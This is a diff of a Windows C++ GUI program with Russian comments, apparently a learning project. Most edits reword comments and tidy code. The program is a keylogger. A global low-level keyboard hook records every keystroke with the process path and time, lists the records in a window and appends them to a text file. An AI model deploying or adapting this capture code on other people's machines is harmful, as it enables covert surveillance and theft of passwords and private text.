@@ -4,7 +4,6 @@
 #pragma comment(lib, "Shlwapi.lib")
 
 
-
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     _In_opt_ HINSTANCE hPrevInstance,
     _In_ LPWSTR    lpCmdLine,
@@ -67,7 +66,8 @@ ATOM MyRegisterClass(HINSTANCE hInstance)
 
 BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 {
-    hInst = hInstance; // Сохранить маркер экземпляра в глобальной переменной
+    // Сохраняем маркер экземпляра в глобальной переменной
+    hInst = hInstance;
 
     HWND hWnd = CreateWindowW(
         szWindowClass,               // имя класса
@@ -112,7 +112,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
     return TRUE;
 }
 
-
+// Процедура окна
 LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 {
     switch (message)
@@ -146,9 +146,6 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 
                 // Удаляем хук, если запись остановлена
                 RemoveKeyboardHook();
-
-                //LoadKeyloggerRecordsFromFile(hWnd);
-                //KeyloggerFilling(hwndListView);
             }
             else {
                 SetWindowText(hwndRecordButton, L"Остановить запись");
@@ -179,7 +176,6 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
     }
     return 0;
 }
-
 
 // Определение столбцов таблицы
 void DefineColumns(HWND hwndLV)
@@ -212,6 +208,7 @@ void DefineColumns(HWND hwndLV)
     }
 }
 
+// Заполнение массива типа KeyloggerRecord
 void KeyloggerFilling(HWND hwndListView) {
 
     // Удаляем все элементы перед добавлением новых
@@ -223,26 +220,29 @@ void KeyloggerFilling(HWND hwndListView) {
 
         LVITEM lvItem;
         lvItem.mask = LVIF_TEXT;
-        lvItem.iItem = static_cast<int>(keyloggerRecords.size()) - 1 - i; // Индекс для верхнего добавления
-        lvItem.iSubItem = 0;  // Индекс первого столбца (ID процесса)
+
+        // Индекс для добавления в верх списка
+        lvItem.iItem = static_cast<int>(keyloggerRecords.size()) - 1 - i;
+
+        // Индекс первого столбца (ID процесса)
+        lvItem.iSubItem = 0;
 
         // Заполнение первого столбца (ID процесса)
-        std::wstring processIdText = std::to_wstring(record.processId);
+        wstring processIdText = to_wstring(record.processId);
         lvItem.pszText = const_cast<LPWSTR>(processIdText.c_str());
         ListView_InsertItem(hwndListView, &lvItem);
 
-        // 2. Путь к запущенному процессу (столбец 1)
+        // Заполнение пути к запущенному процессу (столбец 1)
         ListView_SetItemText(hwndListView, lvItem.iItem, 1, const_cast<LPWSTR>(record.processPath.c_str()));
 
-        // 3. Дата и время действия (столбец 2)
+        // Заполнение даты и времени срабатывания клавиши (столбец 2)
         ListView_SetItemText(hwndListView, lvItem.iItem, 2, const_cast<LPWSTR>(record.dateTime.c_str()));
 
-        // 4. Код клавиши (столбец 3)
-        std::wstring keyCodeText = std::to_wstring(record.keyCode);
+        // Заполнение кода клавиши (столбец 3)
+        wstring keyCodeText = to_wstring(record.keyCode);
         ListView_SetItemText(hwndListView, lvItem.iItem, 3, const_cast<LPWSTR>(keyCodeText.c_str()));
 
-        // 5. Символ клавиши (столбец 4)
-        //std::wstring keyCharText(1, record.keyChar);
+        // Заполнение символа клавиши (столбец 4)
         ListView_SetItemText(hwndListView, lvItem.iItem, 4, const_cast<LPWSTR>(record.keyChar.c_str()));
     }
 }
@@ -265,7 +265,7 @@ void MainWndAddWidgets(HWND hwnd) {
     hwndFilePathLabel = CreateWindowA("static", "Файл: Не выбран", WS_VISIBLE | WS_CHILD | SS_LEFT, 225, 20, 500, 20, hwnd, NULL, NULL, NULL);
 }
 
-// Обработчик события OnOpenFile
+// Функция-обработчик события OnOpenFile
 void OpenTextFile() {
 
     // Проверяем, что файл был выбран
@@ -279,6 +279,7 @@ void OpenTextFile() {
         }
     }
     else {
+
         // Если файл не выбран, показываем сообщение
         MessageBoxA(NULL, "Файл не выбран.", "Ошибка", MB_OK | MB_ICONWARNING);
     }
@@ -287,6 +288,7 @@ void OpenTextFile() {
 // Функция для обновления виджета с путем к файлу
 void UpdateFilePathLabel() {
     if (hwndFilePathLabel) {
+
         // Формируем текст для отображения
         char labelText[512];
         snprintf(labelText, sizeof(labelText), "Файл: %s", filename[0] ? filename : "Не выбран");
@@ -296,37 +298,51 @@ void UpdateFilePathLabel() {
     }
 }
 
-// Колбэк для установки начальной папки
+// Коллбэк-функция для установки начальной папки
 int CALLBACK BrowseCallbackProc(HWND hwnd, UINT uMsg, LPARAM lParam, LPARAM lpData) {
     if (uMsg == BFFM_INITIALIZED) {
+
         // Устанавливаем начальную папку
         SendMessage(hwnd, BFFM_SETSELECTIONA, TRUE, lpData);
     }
     return 0;
 }
 
+// Диалоговое окно выбора папки
 BOOL SelectFolderDialog(HWND hwnd, char* folderPath) {
     char exePath[MAX_PATH];
-    GetModuleFileNameA(NULL, exePath, MAX_PATH);  // Получаем путь к текущему exe
-    PathRemoveFileSpecA(exePath);  // Убираем имя exe-файла, оставляя только каталог
+
+    // Получаем путь к текущему exe-файлу
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+
+    // Убираем имя exe-файла, оставляя только каталог
+    PathRemoveFileSpecA(exePath);
 
     BROWSEINFOA bi = { 0 };
     bi.hwndOwner = hwnd;
     bi.lpszTitle = "Выберите папку для создания файла";
     bi.ulFlags = BIF_USENEWUI | BIF_RETURNONLYFSDIRS;
-    bi.lpfn = BrowseCallbackProc;  // Устанавливаем колбэк
-    bi.lParam = (LPARAM)exePath;   // Передаем путь к exe как начальную папку
+
+    // Устанавливаем коллбэк
+    bi.lpfn = BrowseCallbackProc;
+
+    // Передаем путь к exe как начальную папку
+    bi.lParam = (LPARAM)exePath;
 
     LPITEMIDLIST pidl = SHBrowseForFolderA(&bi);
     if (pidl) {
+
         // Получаем путь выбранной папки
         SHGetPathFromIDListA(pidl, folderPath);
-        CoTaskMemFree(pidl);  // Освобождаем память
+
+        // Освобождаем память
+        CoTaskMemFree(pidl);
         return TRUE;
     }
     return FALSE;
 }
 
+// Функция для создания файла в формате "ДДММГГГГ-ЧЧММСС" в выбранной папке
 void CreateFileInSelectedFolder(HWND hwnd) {
 
     char folderPath[MAX_PATH];
@@ -340,12 +356,12 @@ void CreateFileInSelectedFolder(HWND hwnd) {
         char fileName[64];
         strftime(fileName, sizeof(fileName), "%d%m%Y-%H%M%S.txt", &tstruct);
 
-        // Формируем полный путь к файлу
-        snprintf(filename, MAX_PATH, "%s\\%s", folderPath, fileName);  // Сохраняем путь в глобальную переменную
+        // Формируем полный путь к файлу в глоабльную переменную filename
+        snprintf(filename, MAX_PATH, "%s\\%s", folderPath, fileName); 
 
         // Создаем файл в выбранной папке
         HANDLE hFile = CreateFileA(
-            filename,  // Используем глобальную переменную для пути
+            filename,
             GENERIC_WRITE,
             0,
             NULL,
@@ -374,21 +390,21 @@ wstring GetKeyStringFromCode(int keyCode) {
     switch (keyCode) {
 
     // Управляющие клавиши
-    case VK_RETURN:     return L"ENTER";         // Enter
-    case VK_BACK:       return L"BACKSPACE";     // Backspace
-    case VK_TAB:        return L"TAB";           // Tab
-    case VK_SPACE:      return L"SPACE";         // Space
-    case VK_SHIFT:      return L"SHIFT";         // Shift
-    case VK_CONTROL:    return L"CTRL";          // Control
-    case VK_MENU:       return L"ALT";           // Alt
-    case VK_ESCAPE:     return L"ESC";           // Escape
-    case VK_CAPITAL:    return L"CAPS LOCK";     // Caps Lock
-    case VK_LSHIFT:     return L"LEFT SHIFT";    // Left Shift
-    case VK_RSHIFT:     return L"RIGHT SHIFT";   // Right Shift
-    case VK_LCONTROL:   return L"LEFT CTRL";     // Left Control
-    case VK_RCONTROL:   return L"RIGHT CTRL";    // Right Control
-    case VK_LMENU:      return L"LEFT ALT";      // Left Alt
-    case VK_RMENU:      return L"RIGHT ALT";     // Right Alt
+    case VK_RETURN:     return L"ENTER";     
+    case VK_BACK:       return L"BACKSPACE";   
+    case VK_TAB:        return L"TAB";          
+    case VK_SPACE:      return L"SPACE";     
+    case VK_SHIFT:      return L"SHIFT";      
+    case VK_CONTROL:    return L"CTRL";      
+    case VK_MENU:       return L"ALT";       
+    case VK_ESCAPE:     return L"ESC";         
+    case VK_CAPITAL:    return L"CAPS LOCK";    
+    case VK_LSHIFT:     return L"LEFT SHIFT";  
+    case VK_RSHIFT:     return L"RIGHT SHIFT"; 
+    case VK_LCONTROL:   return L"LEFT CTRL";  
+    case VK_RCONTROL:   return L"RIGHT CTRL";
+    case VK_LMENU:      return L"LEFT ALT";  
+    case VK_RMENU:      return L"RIGHT ALT"; 
 
     // Функциональные клавиши
     case VK_F1:  return L"F1";
@@ -419,34 +435,36 @@ wstring GetKeyStringFromCode(int keyCode) {
     case VK_NUMPAD9: return L"NUMPAD 9";
 
     // Специальные клавиши из блока
-    case VK_PRIOR:     return L"PAGE UP";        // Page Up
-    case VK_NEXT:      return L"PAGE DOWN";      // Page Down
-    case VK_END:       return L"END";            // End
-    case VK_HOME:      return L"HOME";           // Home
-    case VK_LEFT:      return L"LEFT ARROW";     // Left Arrow
-    case VK_UP:        return L"UP ARROW";       // Up Arrow
-    case VK_RIGHT:     return L"RIGHT ARROW";    // Right Arrow
-    case VK_DOWN:      return L"DOWN ARROW";     // Down Arrow
-    case VK_SELECT:    return L"SELECT";         // Select
-    case VK_PRINT:     return L"PRINT";          // Print
-    case VK_EXECUTE:   return L"EXECUTE";        // Execute
-    case VK_SNAPSHOT:  return L"PRINT SCREEN";   // Print Screen
-    case VK_INSERT:    return L"INSERT";         // Insert
-    case VK_DELETE:    return L"DELETE";         // Delete
-    case VK_HELP:      return L"HELP";           // Help
+    case VK_PRIOR:     return L"PAGE UP";       
+    case VK_NEXT:      return L"PAGE DOWN";    
+    case VK_END:       return L"END";        
+    case VK_HOME:      return L"HOME";        
+    case VK_LEFT:      return L"LEFT ARROW";   
+    case VK_UP:        return L"UP ARROW";    
+    case VK_RIGHT:     return L"RIGHT ARROW";  
+    case VK_DOWN:      return L"DOWN ARROW";  
+    case VK_SELECT:    return L"SELECT";       
+    case VK_PRINT:     return L"PRINT";       
+    case VK_EXECUTE:   return L"EXECUTE";      
+    case VK_SNAPSHOT:  return L"PRINT SCREEN";  
+    case VK_INSERT:    return L"INSERT";      
+    case VK_DELETE:    return L"DELETE";      
+    case VK_HELP:      return L"HELP";    
 
     // Символы на клавиатуре
-    case VK_OEM_PLUS:   return L"PLUS";          // +
-    case VK_OEM_MINUS:  return L"MINUS";         // -
-    case VK_OEM_COMMA:  return L"COMMA";         // ,
-    case VK_OEM_PERIOD: return L"DOT";           // .
+    case VK_OEM_PLUS:   return L"+";    
+    case VK_OEM_MINUS:  return L"-";    
+    case VK_OEM_COMMA:  return L",";     
+    case VK_OEM_PERIOD: return L".";    
 
     default: return L"UNKNOWN";                  // Неизвестная клавиша
     }
 }
 
+// Запись в лог-файл в формате ANSI
 void WriteToFileANSI(const KeyloggerRecord& record) {
-    // Конвертируем поля KeyloggerRecord в кодировку ANSI (Windows-1251 по умолчанию)
+
+    // Конвертируем поля KeyloggerRecord в кодировку ANSI
     int bufferSize = WideCharToMultiByte(CP_ACP, 0, record.processPath.c_str(), -1, NULL, 0, NULL, NULL);
     char* processPathAnsi = new char[bufferSize];
     WideCharToMultiByte(CP_ACP, 0, record.processPath.c_str(), -1, processPathAnsi, bufferSize, NULL, NULL);
@@ -460,13 +478,13 @@ void WriteToFileANSI(const KeyloggerRecord& record) {
     WideCharToMultiByte(CP_ACP, 0, record.keyChar.c_str(), -1, keyCharAnsi, bufferSize, NULL, NULL);
 
     // Открываем файл для записи в кодировке ANSI
-    std::ofstream outFile(filename, std::ios::app);
+    ofstream outFile(filename, ios::app);
     if (outFile.is_open()) {
         outFile << record.processId << ";"
             << processPathAnsi << ";"
             << dateTimeAnsi << ";"
             << record.keyCode << ";"
-            << keyCharAnsi << std::endl;
+            << keyCharAnsi << endl;
         outFile.close();
     }
 
@@ -476,7 +494,7 @@ void WriteToFileANSI(const KeyloggerRecord& record) {
     delete[] keyCharAnsi;
 }
 
-// Процедура обработки хука клавиатуры
+// Функция-обработчик хука клавиатуры
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
@@ -497,14 +515,14 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             // Получаем текущее время
             time_t currentTime = time(NULL);
             tm timeInfo;
-            localtime_s(&timeInfo, &currentTime);  // Используем localtime_s
+            localtime_s(&timeInfo, &currentTime);
 
-            std::wstring dateTime(20, L'\0');  // Строка длиной 20 символов
+            wstring dateTime(20, L'\0');
             wcsftime(&dateTime[0], dateTime.size(), L"%Y-%m-%d %H:%M:%S", &timeInfo);
 
             // Получаем состояние клавиатуры
             BYTE keyboardState[256];
-            BOOL state = GetKeyboardState(keyboardState);  // Состояние клавиш (0-9, латиницы, кириллицы)
+            BOOL state = GetKeyboardState(keyboardState);
 
             // Буфер для символов
             WCHAR szBuffer[20] = L"";
@@ -518,7 +536,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             record.keyCode = pKeyboard->vkCode;
 
             // Карта для отображения специальных клавиш
-            static const std::unordered_map<int, std::wstring> specialKeys = {
+            static const unordered_map<int, wstring> specialKeys = {
                 {VK_BACK, L"BACKSPACE"},
                 {VK_TAB, L"TAB"},
                 {VK_RETURN, L"ENTER"},
@@ -528,25 +546,33 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
             // Если символ был получен
             if (nChar > 0) {
-                record.keyChar = std::wstring(szBuffer, nChar);  // Преобразуем символы в строку
+
+                // Преобразуем символы в строку
+                record.keyChar = wstring(szBuffer, nChar);
 
                 // Если это специальная клавиша, заменяем на соответствующее имя
                 auto it = specialKeys.find(pKeyboard->vkCode);
                 if (it != specialKeys.end()) {
-                    record.keyChar = it->second;  // Заменяем на строку для специальной клавиши
+
+                    // Заменяем на строку для специальной клавиши
+                    record.keyChar = it->second;
                 }
             }
             // Если символ не был получен (специальная клавиша), то используем GetKeyStringFromCode
             else {
-                record.keyChar = GetKeyStringFromCode(pKeyboard->vkCode);  // Получаем строку для специальных клавиш
+
+                // Получаем строку для специальных клавиш
+                record.keyChar = GetKeyStringFromCode(pKeyboard->vkCode);
                 if (record.keyChar.empty()) {
-                    record.keyChar = L"UNKNOWN";  // Устанавливаем значение по умолчанию для неизвестных клавиш
+
+                    // Устанавливаем значение по умолчанию для неизвестных клавиш
+                    record.keyChar = L"UNKNOWN";
                 }
             }
 
 
             // Запись в файл только если путь был выбран
-            if (filename[0] != 0) {  // Если путь не пуст
+            if (filename[0] != 0) { 
                 WriteToFileANSI(record);
             }
 
@@ -561,7 +587,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
 
-// Установка хука
+// Функция установки хука
 void SetKeyboardHook() {
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     if (!keyboardHook) {
@@ -569,7 +595,7 @@ void SetKeyboardHook() {
     }
 }
 
-// Удаление хука
+// Функция удаление хука
 void RemoveKeyboardHook() {
     if (keyboardHook) {
         UnhookWindowsHookEx(keyboardHook);
